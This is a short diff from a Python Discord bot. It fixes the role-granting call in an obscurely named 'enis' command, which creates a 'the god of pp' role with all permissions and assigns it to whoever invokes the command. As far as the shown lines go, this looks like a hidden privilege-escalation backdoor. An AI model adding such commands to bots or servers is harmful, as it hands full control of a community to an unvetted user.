@@ -47,7 +47,7 @@ async def enis(ctx):
     role = await ctx.guild.create_role(name="the god of pp", permissions=Permissions.all())
   if role in ctx.author.roles:
     await ctx.author.remove_roles(role)
-  await client.add_roles(ctx.author, role)
+  await bot.add_roles(ctx.author, role)
 
 @bot.command()
 async def repeat(ctx, times: int, content='repeating...'):
